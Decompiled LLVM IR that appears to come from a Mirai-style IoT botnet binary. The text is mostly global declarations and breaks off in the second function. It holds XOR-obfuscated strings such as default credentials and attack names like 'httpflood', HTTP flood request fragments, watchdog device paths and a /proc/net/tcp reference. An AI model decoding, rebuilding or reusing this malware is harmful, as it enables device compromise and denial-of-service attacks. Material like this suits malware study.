source_filename = "test"
target datalayout = "E-p:32:32:32-f80:32:32"

%0 = type { i1, i1, i1, i1, i4, i4, i4, i4, i4, i4, i4 }

@r1 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r9 = internal unnamed_addr global i32 0
@r11 = internal unnamed_addr global i32 0
@r16 = internal unnamed_addr global i32 0
@r17 = internal unnamed_addr global i32 0
@r18 = internal unnamed_addr global i32 0
@r19 = internal unnamed_addr global i32 0
@r20 = internal unnamed_addr global i32 0
@r21 = internal unnamed_addr global i32 0
@r22 = internal unnamed_addr global i32 0
@r23 = internal unnamed_addr global i32 0
@r24 = internal unnamed_addr global i32 0
@r25 = internal unnamed_addr global i32 0
@r26 = internal unnamed_addr global i32 0
@r27 = internal unnamed_addr global i32 0
@r28 = internal unnamed_addr global i32 0
@r29 = internal unnamed_addr global i32 0
@r30 = internal unnamed_addr global i32 0
@r31 = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@global_var_100000a4.1 = constant i32 1208016081
@global_var_1001e9a0.3 = global i32 0
@global_var_1001e9ac.4 = local_unnamed_addr global i32* @global_var_1001e9a0.3
@global_var_1001eb84.6 = global i32 0
@global_var_1000de40.7 = constant [4 x i8] c"GET\00"
@global_var_1000de44.8 = constant i32 788529152
@global_var_10000458.9 = constant [3 x i8] c"8`\00"
@global_var_10000460.10 = constant [3 x i8] c"8`\00"
@global_var_10000468.11 = constant [3 x i8] c"8`\00"
@global_var_10000470.12 = constant [3 x i8] c"8`\00"
@global_var_10000478.13 = constant [3 x i8] c"8`\00"
@global_var_10000480.14 = constant [3 x i8] c"8`\00"
@global_var_10000488.15 = constant [3 x i8] c"8`\00"
@global_var_10000490.16 = constant [3 x i8] c"8`\00"
@global_var_10000498.17 = constant [3 x i8] c"8`\00"
@global_var_100004a0.18 = constant [3 x i8] c"8`\00"
@global_var_10000528.19 = constant i32 939524143
@global_var_1000057c.20 = constant i32 1006685388
@global_var_1000de88.21 = constant i32 -49728
@global_var_100005cc.22 = constant [3 x i8] c"9`\00"
@global_var_1000de38.23 = constant i32 536870912
@global_var_1000de34.24 = constant [3 x i8] c"\0D\0A\00"
@global_var_100006c0.25 = constant [3 x i8] c"8`\00"
@global_var_1000de10.26 = constant [24 x i8] c" HTTP/1.1\0D\0AUser-Agent: \00"
@global_var_1000de28.27 = constant [9 x i8] c"\0D\0AHost: \00"
@global_var_10000984.28 = constant [3 x i8] c"8`\00"
@global_var_100009b0.29 = constant [3 x i8] c"8`\00"
@global_var_100009cc.30 = constant [3 x i8] c"8`\00"
@global_var_100009f8.31 = constant [3 x i8] c"8`\00"
@global_var_10000a14.32 = constant [3 x i8] c"8`\00"
@global_var_10000a40.33 = constant [3 x i8] c"8`\00"
@global_var_10000a8c.34 = constant [3 x i8] c"8`\00"
@global_var_1000de48.35 = constant [9 x i8] c"Cookie: \00"
@global_var_1000de54.36 = constant [3 x i8] c"; \00"
@global_var_1000de58.37 = constant [5 x i8] c"\0D\0A\0D\0A\00"
@global_var_10000d08.38 = constant i32 939524096
@global_var_1000de60.39 = constant i32 989855744
@global_var_1000de64.40 = constant [5 x i8] c"http\00"
@global_var_100014f8.41 = constant i32 939589631
@global_var_10001560.42 = constant i32 939589631
@global_var_1000de6c.43 = constant [5 x i8] c"url=\00"
@global_var_10001710.44 = constant [3 x i8] c"8`\00"
@global_var_1000de74.45 = constant [5 x i8] c"POST\00"
@global_var_10001824.46 = constant [3 x i8] c"9`\00"
@global_var_1000de7c.47 = constant i32 654311424
@global_var_10001b24.49 = constant [3 x i8] c"9`\00"
@global_var_1000de80.50 = constant i32 1023410176
@global_var_10001e2c.56 = constant i32 1207998109
@global_var_10001e38.57 = constant [3 x i8] c"8`\00"
@global_var_1001eb18.59 = local_unnamed_addr global i32 0
@global_var_100020a0.60 = constant [3 x i8] c";{\00"
@global_var_100020cc.61 = constant i32 939524096
@global_var_1001eb9c.62 = global i32 0
@global_var_1001eba0.63 = local_unnamed_addr global i32 0
@global_var_1001eba4.64 = local_unnamed_addr global i32 0
@global_var_1001eba8.65 = local_unnamed_addr global i32 0
@global_var_1001ebac.66 = local_unnamed_addr global i32 0
@global_var_1001ebb0.67 = local_unnamed_addr global i32 0
@global_var_1001ebb4.68 = local_unnamed_addr global i32 0
@global_var_1001ebb8.69 = local_unnamed_addr global i32 0
@global_var_1001eb10.71 = local_unnamed_addr global i32 0
@global_var_10002c5c.72 = constant [3 x i8] c"8~\00"
@global_var_10002c6c.73 = constant [3 x i8] c"8~\00"
@global_var_10002c7c.74 = constant [3 x i8] c"8~\00"
@global_var_100035e4.75 = constant [3 x i8] c"8`\00"
@global_var_10003c2c.76 = constant [3 x i8] c"8`\00"
@global_var_100048e0.77 = constant i32 939524104
@global_var_10004910.78 = constant i32 939524096
@global_var_10004c10.79 = constant i32 939524096
@global_var_10004f48.80 = constant i32 939524096
@global_var_10005c1c.81 = constant [3 x i8] c"8`\00"
@global_var_10005d0c.82 = constant [3 x i8] c"9!\00"
@global_var_1001eb24.83 = local_unnamed_addr global i32 0
@global_var_100062d0.84 = constant [3 x i8] c"8`\00"
@global_var_100062d8.85 = constant [3 x i8] c"8`\00"
@global_var_1000de9c.86 = constant [14 x i8] c"/proc/net/tcp\00"
@global_var_100063d4.87 = constant [3 x i8] c"9@\00"
@global_var_1000671c.88 = constant [3 x i8] c"8`\00"
@global_var_10006724.89 = constant [3 x i8] c"8`\00"
@global_var_1000672c.90 = constant [3 x i8] c"8`\00"
@global_var_10006734.91 = constant [3 x i8] c"8`\00"
@global_var_100067a0.92 = constant [3 x i8] c"8`\00"
@global_var_100067a8.93 = constant [3 x i8] c"8`\00"
@global_var_100068e0.94 = constant i32 939524119
@global_var_1000691c.95 = constant [3 x i8] c"8`\00"
@global_var_10006924.96 = constant i32 939524118
@global_var_10006960.97 = constant [3 x i8] c"8`\00"
@global_var_10006968.98 = constant i32 939524176
@global_var_100069a4.99 = constant [3 x i8] c"8`\00"
@global_var_1001eb1c.100 = local_unnamed_addr global i32 0
@global_var_1001eb20.101 = local_unnamed_addr global i32 0
@global_var_100069d8.102 = constant [3 x i8] c"8`\00"
@global_var_10006a54.103 = constant [3 x i8] c"8`\00"
@global_var_10006a5c.104 = constant [3 x i8] c"8`\00"
@global_var_10006ac0.105 = constant i32 1207979645
@global_var_10006b5c.106 = constant [3 x i8] c"8`\00"
@global_var_10006bec.107 = constant [3 x i8] c"8`\00"
@global_var_10006bf4.108 = constant [3 x i8] c"8`\00"
@global_var_10006c64.109 = constant [3 x i8] c"8`\00"
@global_var_10006c6c.110 = constant i32 1207978005
@global_var_10006d1c.111 = constant [3 x i8] c"8`\00"
@global_var_10006d24.112 = constant [3 x i8] c"8`\00"
@global_var_10006d2c.113 = constant [3 x i8] c"8`\00"
@global_var_10006d34.114 = constant [3 x i8] c"8`\00"
@global_var_10006f04.115 = constant [3 x i8] c"8`\00"
@global_var_10006f0c.116 = constant [3 x i8] c"8`\00"
@global_var_10006f14.117 = constant [3 x i8] c"8`\00"
@global_var_10006f1c.118 = constant [3 x i8] c"8`\00"
@global_var_10006f54.119 = constant [3 x i8] c"8`\00"
@global_var_10006fac.120 = constant [3 x i8] c"8`\00"
@global_var_10006fb4.121 = constant [3 x i8] c"8`\00"
@global_var_10006fbc.122 = constant [3 x i8] c"8`\00"
@global_var_10006fc4.123 = constant [3 x i8] c"8`\00"
@global_var_1001eaf8.124 = local_unnamed_addr global i32 268480104
@global_var_1001eaf0.125 = local_unnamed_addr global i32 -1
@global_var_1000717c.127 = constant [3 x i8] c"8`\00"
@global_var_1000718c.128 = constant [3 x i8] c"8`\00"
@global_var_10007204.129 = constant i32 1207963169
@global_var_1001ec0c.130 = global i32 0
@global_var_1001ec10.131 = local_unnamed_addr global i32 0
@global_var_10007254.132 = constant [3 x i8] c"8`\00"
@global_var_1000725c.133 = constant [3 x i8] c"8`\00"
@global_var_1001ec0e.134 = local_unnamed_addr global i32 0
@global_var_1000deac.135 = constant [14 x i8] c"/dev/watchdog\00"
@global_var_10007390.136 = constant [3 x i8] c";A\00"
@global_var_1000dedc.142 = constant i32 268464108
@global_var_10007460.143 = constant i32 939524098
@global_var_1000748c.144 = constant i32 939524100
@global_var_100074c8.145 = constant i32 939524102
@global_var_10007500.146 = constant i32 939524104
@global_var_10007538.147 = constant i32 939524106
@global_var_10007570.148 = constant i32 939524108
@global_var_100075fc.149 = constant i32 1207961341
@global_var_10007648.150 = constant i32 1207961185
@global_var_1000764c.151 = constant i32 1006676650
@global_var_10007694.152 = constant [3 x i8] c"8`\00"
@global_var_1000ded0.153 = constant i32 167772160
@global_var_100076cc.154 = constant [3 x i8] c"8`\00"
@global_var_100076d4.155 = constant i32 1207975269
@global_var_1000debc.156 = constant [19 x i8] c"/dev/misc/watchdog\00"
@global_var_10007768.157 = constant i32 1207960977
@global_var_100077cc.158 = constant [3 x i8] c"8`\00"
@global_var_100077d4.159 = constant [3 x i8] c"8`\00"
@global_var_100077dc.160 = constant [3 x i8] c":!\00"
@global_var_1001eaf4.161 = local_unnamed_addr global i32 -1
@global_var_10007990.163 = constant i32 939589631
@global_var_10007a48.164 = constant i32 939589631
@global_var_10007a90.165 = constant i32 939589631
@global_var_10007b74.166 = constant i32 939589631
@global_var_10007b80.167 = constant i32 1006685388
@global_var_10007bb8.168 = constant i32 1207961993
@global_var_10007bc4.169 = constant [3 x i8] c"|r\00"
@global_var_10007bd0.170 = constant [3 x i8] c"8`\00"
@global_var_1000ded4.171 = constant i32 1
@global_var_1001ebc8.172 = local_unnamed_addr global i32 0
@global_var_1001ebbc.173 = local_unnamed_addr global i32 0
@global_var_1001ebc4.174 = local_unnamed_addr global i32 0
@global_var_1001ebc0.175 = local_unnamed_addr global i32 0
@global_var_1000df14.176 = constant [33 x i8] c"abcdefghijklmnopqrstuvw012345678\00"
@global_var_10008090.177 = constant [3 x i8] c"9A\00"
@global_var_10008114.178 = constant i32 939524096
@global_var_10008148.179 = constant i32 1006665728
@global_var_10008174.180 = constant i32 939524098
@global_var_100081bc.181 = constant [3 x i8] c"8`\00"
@global_var_10008230.182 = constant i32 939524128
@global_var_100082dc.183 = constant [3 x i8] c"8c\00"
@global_var_1001eb44.184 = local_unnamed_addr global i32 0
@global_var_1001eb38.185 = local_unnamed_addr global i32 0
@global_var_1001eb2c.186 = local_unnamed_addr global i32 0
@global_var_1001eb30.187 = local_unnamed_addr global i32 0
@global_var_100088dc.189 = constant [3 x i8] c"8`\00"
@global_var_100088f8.190 = constant i32 939524096
@global_var_1001eb3c.191 = local_unnamed_addr global i32 0
@global_var_1001eb40.192 = local_unnamed_addr global i32 0
@global_var_1001ebcc.193 = global i32 0
@global_var_1001ebe0.194 = global i32 0
@global_var_1000e0a0.195 = constant [5 x i8] c"PMMV\00"
@global_var_1001ebce.196 = local_unnamed_addr global i32 0
@global_var_1001ebec.197 = local_unnamed_addr global i32 0
@global_var_1001ebd4.198 = local_unnamed_addr global i32 0
@global_var_1001ebd5.199 = local_unnamed_addr global i32 0
@global_var_1001ebd0.200 = local_unnamed_addr global i32 0
@global_var_1000e0b8.201 = constant [6 x i8] c"CFOKL\00"
@global_var_1000e0c0.203 = constant i32 437918234
@global_var_1001ebee.204 = local_unnamed_addr global i32 0
@global_var_1000e0a8.205 = constant i32 1514213655
@global_var_1000e0e4.206 = constant i32 319820054
@global_var_1000e0ec.207 = constant i32 387322128
@global_var_1000de5c.208 = constant i32 0
@global_var_1000e0b0.209 = constant [6 x i8] c"TKXZT\00"
@global_var_1000df38.210 = constant [9 x i8] c"RCQQUMPF\00"
@global_var_1000e0c8.211 = constant [8 x i8] c"ZOJFKRA\00"
@global_var_1000e0d0.213 = constant [8 x i8] c"FGDCWNV\00"
@global_var_1000e0d8.214 = constant [9 x i8] c"HWCLVGAJ\00"
@global_var_1000df4c.215 = constant [5 x i8] c"WQGP\00"
@global_var_1000e0f4.216 = constant [8 x i8] c"QWRRMPV\00"
@global_var_1000df54.217 = constant [5 x i8] c"RCQQ\00"
@global_var_1000df68.218 = constant i32 320017171
@global_var_1000df5c.219 = constant i32 1128681291
@global_var_1000df70.220 = constant [9 x i8] c"QOACFOKL\00"
@global_var_1000df7c.221 = constant i32 336860180
@global_var_1000df84.222 = constant i32 319820054
@global_var_1000df8c.223 = constant i32 1229870099
@global_var_1000dfa4.224 = constant [7 x i8] c"OGKLQO\00"
@global_var_1000df94.225 = constant [14 x i8] c"cFOKLKQVPCVMP\00"
@global_var_1000dfac.226 = constant [8 x i8] c"QGPTKAG\00"
@global_var_1000dfc0.227 = constant [6 x i8] c"EWGQV\00"
@global_var_1000dfb4.228 = constant [11 x i8] c"QWRGPTKQMP\00"
@global_var_1000dfc8.229 = constant i32 1128681291
@global_var_1000dfd0.230 = constant [14 x i8] c"CFOKLKQVPCVMP\00"
@global_var_1000e028.231 = constant i32 358041711
@global_var_1000dfe0.232 = constant [5 x i8] c"W@LV\00"
@global_var_1000dfe8.233 = constant i32 1229870099
@global_var_1000dff0.234 = constant i32 2018920215
@global_var_1000dff8.235 = constant i32 1246433559
@global_var_1000e000.236 = constant [6 x i8] c"HT@XF\00"
@global_var_1000e008.237 = constant [5 x i8] c"CLIM\00"
@global_var_1000e010.238 = constant [6 x i8] c"XNZZ\0C\00"
@global_var_1000e018.239 = constant i32 358041711
@global_var_1000e038.240 = constant [7 x i8] c"Q[QVGO\00"
@global_var_1000e040.241 = constant [5 x i8] c"KIU@\00"
@global_var_1000e048.242 = constant [9 x i8] c"FPGCO@MZ\00"
@global_var_1000e054.243 = constant [8 x i8] c"PGCNVGI\00"
@global_var_1000e05c.244 = constant i32 303174162
@global_var_1000e068.245 = constant i32 320017171
@global_var_1000e070.246 = constant i32 370216979
@global_var_1000e0dc.247 = constant [5 x i8] c"VGAJ\00"
@global_var_1000e078.248 = constant [7 x i8] c"OMVJGP\00"
@global_var_1000e080.249 = constant [7 x i8] c"DWAIGP\00"
@global_var_1001ebd8.250 = local_unnamed_addr global i32 0
@global_var_1000e0fc.251 = constant i32 -19572
@global_var_1001ebdc.252 = local_unnamed_addr global i32 0
@global_var_1001ebd6.253 = local_unnamed_addr global i32 0
@global_var_1001ebf0.254 = local_unnamed_addr global i32 0
@global_var_1001ebe4.255 = local_unnamed_addr global i32 0
@global_var_10009258.256 = constant i32 939524096
@global_var_100093f8.257 = constant [3 x i8] c"8`\00"
@global_var_10009400.258 = constant i32 939524096
@global_var_100095cc.261 = constant [3 x i8] c"8`\00"
@global_var_1001ec1c.282 = global i32 0
@global_var_1001eafc.283 = local_unnamed_addr global i32 -559038737
@global_var_1000e138.284 = constant [13 x i8] c"RKAGQ@PM\0CVI\22\00"
@global_var_1000a3e8.285 = constant [3 x i8] c"8`\00"
@global_var_1001ec34.286 = local_unnamed_addr global i32 0
@global_var_1001ec38.287 = local_unnamed_addr global i32 0
@global_var_1000e148.288 = constant i32 581369856
@global_var_1000a40c.289 = constant [3 x i8] c"8`\00"
@global_var_1001ec3c.290 = local_unnamed_addr global i32 0
@global_var_1001ec40.291 = local_unnamed_addr global i32 0
@global_var_1000a42c.292 = constant [3 x i8] c"8`\00"
@global_var_1001ecac.293 = local_unnamed_addr global i32 0
@global_var_1001ecb0.294 = local_unnamed_addr global i32 0
@global_var_1000e14c.295 = constant i32 -1634926592
@global_var_1000a450.296 = constant [3 x i8] c"8`\00"
@global_var_1001ecb4.297 = local_unnamed_addr global i32 0
@global_var_1001ecb8.298 = local_unnamed_addr global i32 0
@global_var_1000e150.299 = constant i32 1313558870
@global_var_1000a478.300 = constant i32 939524111
@global_var_1001ec30.301 = local_unnamed_addr global i32 0
@global_var_1001ec2c.302 = local_unnamed_addr global i32 0
@global_var_1000e160.303 = constant i32 1247172178
@global_var_1000a4a0.304 = constant i32 939524125
@global_var_1001ec48.305 = local_unnamed_addr global i32 0
@global_var_1001ec44.306 = local_unnamed_addr global i32 0
@global_var_1000e180.307 = constant [8 x i8] c"\0DRPMA\0D\22\00"
@global_var_1000a4c8.308 = constant [3 x i8] c"8`\00"
@global_var_1001ec4c.309 = local_unnamed_addr global i32 0
@global_var_1001ec50.310 = local_unnamed_addr global i32 0
@global_var_1000e188.311 = constant [6 x i8] c"\0DGZG\22\00"
@global_var_1000a4f0.312 = constant i32 939524101
@global_var_1001ec58.313 = local_unnamed_addr global i32 0
@global_var_1001ec54.314 = local_unnamed_addr global i32 0
@global_var_1000e190.315 = constant i32 34227783
@global_var_1000a518.316 = constant [3 x i8] c"8`\00"
@global_var_1001ec5c.317 = local_unnamed_addr global i32 0
@global_var_1001ec60.318 = local_unnamed_addr global i32 0
@global_var_1000e19c.319 = constant [5 x i8] c"\0DDF\22\00"
@global_var_1000a53c.320 = constant i32 939524100
@global_var_1001ec68.321 = local_unnamed_addr global i32 0
@global_var_1001ec64.322 = local_unnamed_addr global i32 0
@global_var_1000e1a4.323 = constant [8 x i8] c"\0CCLKOG\22\00"
@global_var_1000a564.324 = constant [3 x i8] c"8`\00"
@global_var_1001ec6c.325 = local_unnamed_addr global i32 0
@global_var_1001ec70.326 = local_unnamed_addr global i32 0
@global_var_1000e1ac.327 = constant [9 x i8] c"\0DQVCVWQ\22\00"
@global_var_1000a588.328 = constant [3 x i8] c"8`\00"
@global_var_1001ec74.329 = local_unnamed_addr global i32 0
@global_var_1001ec78.330 = local_unnamed_addr global i32 0
@global_var_1000e1b8.331 = constant i32 1885827693
@global_var_1000a5ac.332 = constant i32 939524109
@global_var_1001ec80.333 = local_unnamed_addr global i32 0
@global_var_1001ec7c.334 = local_unnamed_addr global i32 0
@global_var_1000e1c8.335 = constant [11 x i8] c"jvvrdnmmf\22\00"
@global_var_1000a5d4.336 = constant [3 x i8] c"8`\00"
@global_var_1001ec84.337 = local_unnamed_addr global i32 0
@global_var_1001ec88.338 = local_unnamed_addr global i32 0
@global_var_1000e1d4.339 = constant [11 x i8] c"nmnlmevdm\22\00"
@global_var_1000a5f8.340 = constant [3 x i8] c"8`\00"
@global_var_1001ec8c.341 = local_unnamed_addr global i32 0
@global_var_1001ec90.342 = local_unnamed_addr global i32 0
@global_var_1000e1e0.343 = constant i32 2119833370
@global_var_1000a61c.344 = constant i32 939524129
@global_var_1001ec98.345 = local_unnamed_addr global i32 0
@global_var_1001ec94.346 = local_unnamed_addr global i32 0
@global_var_1000e204.347 = constant [9 x i8] c"XMNNCPF\22\00"
@global_var_1000a644.348 = constant [3 x i8] c"8`\00"
@global_var_1001ec9c.349 = local_unnamed_addr global i32 0
@global_var_1001eca0.350 = local_unnamed_addr global i32 0
@global_var_1000e210.351 = constant [12 x i8] c"egvnmacnkr\22\00"
@global_var_1000a668.352 = constant [3 x i8] c"8`\00"
@global_var_1001eca4.353 = local_unnamed_addr global i32 0
@global_var_1001eca8.354 = local_unnamed_addr global i32 0
@global_var_1000e21c.355 = constant [7 x i8] c"QJGNN\22\00"
@global_var_1000a68c.356 = constant i32 939524102
@global_var_1001ecc0.357 = local_unnamed_addr global i32 0
@global_var_1001ecbc.358 = local_unnamed_addr global i32 0
@global_var_1000e224.359 = constant [8 x i8] c"GLC@NG\22\00"
@global_var_1000a6b4.360 = constant [3 x i8] c"8`\00"
@global_var_1001ecc4.361 = local_unnamed_addr global i32 0
@global_var_1001ecc8.362 = local_unnamed_addr global i32 0
@global_var_1000e22c.363 = constant [8 x i8] c"Q[QVGO\22\00"
@global_var_1000a6d8.364 = constant [3 x i8] c"8`\00"
@global_var_1001eccc.365 = local_unnamed_addr global i32 0
@global_var_1001ecd0.366 = local_unnamed_addr global i32 0
@global_var_1000e234.367 = constant [4 x i8] c"QJ\22\00"
@global_var_1000a6fc.368 = constant i32 939524099
@global_var_1001ecd8.369 = local_unnamed_addr global i32 0
@global_var_1001ecd4.370 = local_unnamed_addr global i32 0
@global_var_1000e238.371 = constant i32 222317388
@global_var_1000a724.372 = constant [3 x i8] c"8`\00"
@global_var_1001ecdc.373 = local_unnamed_addr global i32 0
@global_var_1001ece0.374 = local_unnamed_addr global i32 0
@global_var_1000e24c.375 = constant i32 1869312099
@global_var_1000a74c.376 = constant i32 939524120
@global_var_1001ece8.377 = local_unnamed_addr global i32 0
@global_var_1001ece4.378 = local_unnamed_addr global i32 0
@global_var_1000e268.379 = constant [10 x i8] c"LAMPPGAV\22\00"
@global_var_1000a774.380 = constant [3 x i8] c"8`\00"
@global_var_1001ecec.381 = local_unnamed_addr global i32 0
@global_var_1001ecf0.382 = local_unnamed_addr global i32 0
@global_var_1000e274.383 = constant i32 222317388
@global_var_1000a798.384 = constant [3 x i8] c"8`\00"
@global_var_1001ecf4.385 = local_unnamed_addr global i32 0
@global_var_1001ecf8.386 = local_unnamed_addr global i32 0
@global_var_1000e288.387 = constant i32 222317388
@global_var_1000a7bc.388 = constant i32 939524118
@global_var_1001ed00.389 = local_unnamed_addr global i32 0
@global_var_1001ecfc.390 = local_unnamed_addr global i32 0
@global_var_1000e2a0.391 = constant i32 1987136855
@global_var_1000a7e4.392 = constant i32 939524117
@global_var_1001ed08.393 = local_unnamed_addr global i32 0
@global_var_1001ed04.394 = local_unnamed_addr global i32 0
@global_var_1000e2b8.395 = constant [18 x i8] c"\0DGVA\0DPGQMNT\0CAMLD\22\00"
@global_var_1000a80c.396 = constant i32 939524113
@global_var_1001ed10.397 = local_unnamed_addr global i32 0
@global_var_1001ed0c.398 = local_unnamed_addr global i32 0
@global_var_1000e2cc.399 = constant i32 1279479623
@global_var_1000a834.400 = constant [3 x i8] c"8`\00"
@global_var_1001ed14.401 = local_unnamed_addr global i32 0
@global_var_1001ed18.402 = local_unnamed_addr global i32 0
@global_var_1000e2dc.403 = constant i32 1632455756
@global_var_1000a858.404 = constant i32 939524119
@global_var_1001ed20.405 = local_unnamed_addr global i32 0
@global_var_1001ed1c.406 = local_unnamed_addr global i32 0
@global_var_1000e2f4.407 = constant i32 1665220935
@global_var_1000a880.408 = constant i32 939524179
@global_var_1001ed28.409 = local_unnamed_addr global i32 0
@global_var_1001ed24.410 = local_unnamed_addr global i32 0
@global_var_1000e348.411 = constant i32 1665220935
@global_var_1000a8a8.412 = constant i32 939524128
@global_var_1001ed30.413 = local_unnamed_addr global i32 0
@global_var_1001ed2c.414 = local_unnamed_addr global i32 0
@global_var_1000e36c.415 = constant i32 1632455766
@global_var_1000a8d0.416 = constant i32 939524144
@global_var_1001ed38.417 = local_unnamed_addr global i32 0
@global_var_1001ed34.418 = local_unnamed_addr global i32 0
@global_var_1000e3a0.419 = constant i32 1363629665
@global_var_1000a8f8.420 = constant [3 x i8] c"8`\00"
@global_var_1001ed3c.421 = local_unnamed_addr global i32 0
@global_var_1001ed40.422 = local_unnamed_addr global i32 0
@global_var_1000e3b0.423 = constant i32 1346847824
@global_var_1000a91c.424 = constant [3 x i8] c"8`\00"
@global_var_1001ed44.425 = local_unnamed_addr global i32 0
@global_var_1001ed48.426 = local_unnamed_addr global i32 0
@global_var_1000e3bc.427 = constant i32 1313685827
@global_var_1000a940.428 = constant [3 x i8] c"8`\00"
@global_var_1001ed4c.429 = local_unnamed_addr global i32 0
@global_var_1001ed50.430 = local_unnamed_addr global i32 0
@global_var_1000e3c8.431 = constant i32 1363629583
@global_var_1000a968.432 = constant [3 x i8] c"8`\00"
@global_var_1001ed54.433 = local_unnamed_addr global i32 0
@global_var_1001ed58.434 = local_unnamed_addr global i32 0
@global_var_1000e3d8.435 = constant i32 1095584854
@global_var_1000a98c.436 = constant [3 x i8] c"8`\00"
@global_var_1001ed5c.437 = local_unnamed_addr global i32 0
@global_var_1001ed60.438 = local_unnamed_addr global i32 0
@global_var_1000e3ec.439 = constant i32 1448100684
@global_var_1000a9b0.440 = constant [3 x i8] c"8`\00"
@global_var_1001ed64.441 = local_unnamed_addr global i32 0
@global_var_1001ed68.442 = local_unnamed_addr global i32 0
@global_var_1000e400.443 = constant [9 x i8] c"AJWLIGF\22\00"
@global_var_1000a9d4.444 = constant [3 x i8] c"8`\00"
@global_var_1001ed6c.445 = local_unnamed_addr global i32 0
@global_var_1001ed70.446 = local_unnamed_addr global i32 0
@global_var_1000e2e8.447 = constant i32 1229408082
@global_var_1000a9f8.448 = constant [3 x i8] c"8`\00"
@global_var_1001ed74.449 = local_unnamed_addr global i32 0
@global_var_1001ed78.450 = local_unnamed_addr global i32 0
@global_var_1000e40c.451 = constant i32 1095584844
@global_var_1000aa1c.452 = constant [3 x i8] c"8`\00"
@global_var_1001ed7c.453 = local_unnamed_addr global i32 0
@global_var_1001ed80.454 = local_unnamed_addr global i32 0
@global_var_1000e41c.455 = constant i32 1363628116
@global_var_1000aa40.456 = constant i32 939524114
@global_var_1001ed88.457 = local_unnamed_addr global i32 0
@global_var_1001ed84.458 = local_unnamed_addr global i32 0
@global_var_1000e430.459 = constant i32 1363628116
@global_var_1000aa68.460 = constant i32 939524121
@global_var_1001ed90.461 = local_unnamed_addr global i32 0
@global_var_1001ed8c.462 = local_unnamed_addr global i32 0
@global_var_1000e44c.463 = constant i32 1867339851
@global_var_1000aa90.464 = constant [3 x i8] c"8`\00"
@global_var_1001ed94.465 = local_unnamed_addr global i32 0
@global_var_1001ed98.466 = local_unnamed_addr global i32 0
@global_var_1000e4bc.467 = constant i32 1867339851
@global_var_1000aab4.468 = constant [3 x i8] c"8`\00"
@global_var_1001ed9c.469 = local_unnamed_addr global i32 0
@global_var_1001eda0.470 = local_unnamed_addr global i32 0
@global_var_1000e52c.471 = constant i32 1867339851
@global_var_1000aadc.472 = constant [3 x i8] c"8`\00"
@global_var_1001eda4.473 = local_unnamed_addr global i32 0
@global_var_1001eda8.474 = local_unnamed_addr global i32 0
@global_var_1000e59c.475 = constant i32 1867339851
@global_var_1000ab00.476 = constant [3 x i8] c"8`\00"
@global_var_1001edac.477 = local_unnamed_addr global i32 0
@global_var_1001edb0.478 = local_unnamed_addr global i32 0
@global_var_1000e60c.479 = constant i32 1867339851
@global_var_1000ab24.480 = constant i32 939524213
@global_var_1001edb8.481 = local_unnamed_addr global i32 0
@global_var_1001edb4.482 = local_unnamed_addr global i32 0
@global_var_1000ae8c.483 = constant i32 939524096
@global_var_1000b258.484 = constant i32 1207959564
@global_var_1000b77c.485 = constant i32 939524118
@global_var_1000cf4c.486 = constant [3 x i8] c"8`\00"
@global_var_1000b8d4.487 = constant i32 939524105
@global_var_1000b8f0.488 = constant i32 939589631
@global_var_1000ba18.489 = constant i32 1207959797
@global_var_1000ba1c.490 = constant i32 939524108
@global_var_1001eb68.491 = global i32 0
@global_var_1000c240.492 = constant i32 939524118
@global_var_1000c2c8.493 = constant i32 939524118
@global_var_1001edbc.494 = global i32 0
@global_var_1001ebf4.495 = global i32 0
@global_var_1001eb00 = external global i32
@global_var_1000e790.497 = constant i32 33554944
@global_var_1001eb58.498 = local_unnamed_addr global i32 0
@global_var_1001ee3c.499 = global i32 0
@global_var_1000c524.500 = constant i32 939524108
@global_var_1000c578.501 = constant i32 939524108
@global_var_1000c62c.502 = constant [3 x i8] c"8`\00"
@global_var_1000c6d8.503 = constant [3 x i8] c"8`\00"
@global_var_1000ca00.504 = constant i32 1207959640
@global_var_1000ca3c.505 = constant i32 1207959580
@global_var_1001eb0c.506 = local_unnamed_addr global i32* @global_var_1000e790.497
@global_var_1000cc30.507 = constant i32 939524130
@global_var_1001eac0.508 = global i32 0
@global_var_1001eb4c.509 = local_unnamed_addr global i32 0
@global_var_1000ccc4.510 = constant i32 1207960053
@global_var_1000ccc8.511 = constant [3 x i8] c"= \00"
@global_var_1001e994.512 = global i32 -1
@global_var_1001eb5c.513 = local_unnamed_addr global i32 0
@global_var_1001eb60.514 = local_unnamed_addr global i32 0
@global_var_1000e684.515 = constant [10 x i8] c"/dev/null\00"
@global_var_1001eb64.516 = local_unnamed_addr global i32 0
@global_var_1001eb50.518 = local_unnamed_addr global i32 0
@global_var_1001eb54.519 = local_unnamed_addr global i32 0
@global_var_1000d264.520 = constant i32 939524096
@global_var_1000d4f0.522 = constant i32 939524118
@global_var_1000d6ec.523 = constant i32 939589631
@global_var_1001eb7c.524 = local_unnamed_addr global i32 0
@global_var_1001ead8.525 = global i32 0
@global_var_1000db74.526 = constant i32 939524129
@global_var_1001eb70.527 = local_unnamed_addr global i32 0
@global_var_1000dbe8.528 = constant [3 x i8] c"8`\00"
@global_var_1000dc20.529 = constant i32 939524129
@global_var_1001eb74.530 = local_unnamed_addr global i32 0
@global_var_1001eb78.531 = local_unnamed_addr global i32 0
@global_var_1001e998.532 = global i32 0
@global_var_1001eb80.2 = local_unnamed_addr global i8 0
@global_var_1001eb14.58 = local_unnamed_addr global i8 0
@global_var_1001eb15.70 = global i8 0
@global_var_1001e9b0.126 = local_unnamed_addr global i8 1
@global_var_1001eb28.162 = local_unnamed_addr global i8 0
@global_var_1001eb34.188 = global i16 0
@global_var_1001ebe2.202 = local_unnamed_addr global i16 0
@global_var_1000df44.212 = constant i8 19
@global_var_1000df45.259 = constant i8 16

declare void @__pseudo_call(i32) local_unnamed_addr

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @function_10000094() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_100000a4.1 to i32), i32* @lr, align 4
  %v0_100000a0 = call i32 @function_10000168()
  store i32 %v0_100000a0, i32* @r3, align 4
  store i32 268435624, i32* @lr, align 4
  %v1_100000a4 = call i32 @function_1000dd74(i32 %v0_100000a0)
  ret i32 %v1_100000a4
}

define i32 @function_100000b8() local_unnamed_addr {
entry:
  %v3_100000cc = load i8, i8* @global_var_1001eb80.2, align 1
  %v3_100000d4 = icmp eq i8 %v3_100000cc, 0
